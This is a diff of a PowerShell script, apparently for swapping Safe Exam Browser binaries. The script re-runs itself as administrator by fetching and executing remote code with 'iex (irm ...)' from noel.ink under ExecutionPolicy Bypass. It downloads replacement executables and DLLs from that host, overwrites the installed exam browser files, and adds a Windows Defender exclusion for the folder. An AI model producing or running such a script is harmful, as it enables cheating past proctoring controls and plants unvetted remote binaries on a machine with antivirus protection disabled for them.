@@ -2,7 +2,6 @@
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
     Write-Host "Script is not running as Administrator. Relaunching with elevated privileges..." -ForegroundColor Yellow
     $scriptUrl = "https://noel.ink/safe-exam"
-    # Build the argument string so that the new elevated process downloads & runs this same script.
     $arguments = '-NoProfile -ExecutionPolicy Bypass -Command "iex (irm ''{0}'')" -f "' + $scriptUrl + '"'
     Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs
     exit
@@ -28,13 +27,18 @@ if (-Not (Test-Path $downloadFolder)) {
 
 # Define the file identifiers and their source URLs.
 $filesToDownload = @{
-    "x1" = "https://noel.ink/x1"
-    "x2" = "https://noel.ink/x2"
+    "SafeExamBrowser.Client.exe"            = "https://noel.ink/safe-exam/SafeExamBrowser.Client.exe"
+    "SafeExamBrowser.Configuration.dll"       = "https://noel.ink/safe-exam/SafeExamBrowser.Configuration.dll"
+    "SafeExamBrowser.Monitoring.dll"          = "https://noel.ink/safe-exam/SafeExamBrowser.Monitoring.dll"
+    "SafeExamBrowser.UserInterface.Desktop.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.UserInterface.Desktop.dll"
+    "SafeExamBrowser.UserInterface.Shared.dll"  = "https://noel.ink/safe-exam/SafeExamBrowser.UserInterface.Shared.dll"
+    "SafeExamBrowser.WindowsApi.dll"          = "https://noel.ink/safe-exam/SafeExamBrowser.WindowsApi.dll"
+    "SafeExamBrowser.exe"                     = "https://noel.ink/safe-exam/SafeExamBrowser.exe"
 }
 
-foreach ($name in $filesToDownload.Keys) {
-    $url = $filesToDownload[$name]
-    $destination = Join-Path $downloadFolder $name
+foreach ($fileName in $filesToDownload.Keys) {
+    $url = $filesToDownload[$fileName]
+    $destination = Join-Path $downloadFolder $fileName
     Write-Host "Downloading '$url' to '$destination'..." -ForegroundColor Cyan
     try {
         Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
@@ -52,9 +56,9 @@ if (-Not (Test-Path $targetPath)) {
     exit 1
 }
 
-foreach ($name in $filesToDownload.Keys) {
-    $sourceFile = Join-Path $downloadFolder $name
-    $destinationFile = Join-Path $targetPath $name
+foreach ($fileName in $filesToDownload.Keys) {
+    $sourceFile = Join-Path $downloadFolder $fileName
+    $destinationFile = Join-Path $targetPath $fileName
     Write-Host "Copying '$sourceFile' to '$destinationFile'..." -ForegroundColor Cyan
     try {
         Copy-Item -Path $sourceFile -Destination $destinationFile -Force
@@ -65,8 +69,7 @@ foreach ($name in $filesToDownload.Keys) {
     }
 }
 
-# 4. Attempt to add a Windows Defender exclusion for the target folder 
-#    (this may help prevent antivirus interference; note that other AVs will need different handling).
+# 4. Attempt to add a Windows Defender exclusion for the target folder.
 try {
     Write-Host "Adding Windows Defender exclusion for '$targetPath'..." -ForegroundColor Cyan
     Add-MpPreference -ExclusionPath $targetPath
